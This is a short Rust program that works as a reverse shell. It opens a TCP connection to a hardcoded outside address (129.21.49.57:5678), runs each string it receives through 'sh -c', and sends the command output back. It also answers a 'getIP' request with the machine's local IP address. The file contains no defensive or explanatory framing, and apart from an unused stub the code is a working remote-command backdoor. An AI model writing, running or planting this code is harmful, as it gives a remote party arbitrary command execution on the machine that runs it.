use std::net::{TcpStream, Shutdown};
use std::io::Write;
use std::io::Read;
use std::process::Command;
use local_ip_address::local_ip;

fn main() {
    let mut stream = TcpStream::connect("129.21.49.57:5678").unwrap(); //connects via TCP
    let mut i = 0; 
    while i < 15{
        let mut buffer = [0;1024]; //set the buffer
        stream.read(&mut buffer).unwrap(); //read the buffer
        let recv = std::str::from_utf8(&buffer).unwrap().trim_matches(char::from(0)); //string of recv
        println!("Received: {}",&recv); //print that shit
            if recv.contains("getIP") { //if it's getIP, return the IP
                let localIP = local_ip().unwrap(); //get the local IP
                println!("Sent: {}",&localIP); //print it
                let localIP = format!("{}",&localIP);
                let localIP = localIP.as_bytes();
                stream.write(&localIP).unwrap(); //send it
        } else {
            println!("Out: {}",&recv);
            let output = Command::new("sh").arg("-c").arg(&recv).output().expect("execution failed from the client"); //run this
            let stderrout = format!("{}{}",String::from_utf8_lossy(&output.stdout),String::from_utf8_lossy(&output.stderr));
            println!("Output: {}",stderrout);
            stream.write(&stderrout.as_bytes()).unwrap(); //send that shit
        };
        i+=1;
    }
    stream.shutdown(Shutdown::Both).expect("shutdown call failed");
}

fn sendCommand(cmd: &str, stream: &TcpStream){
    true;
}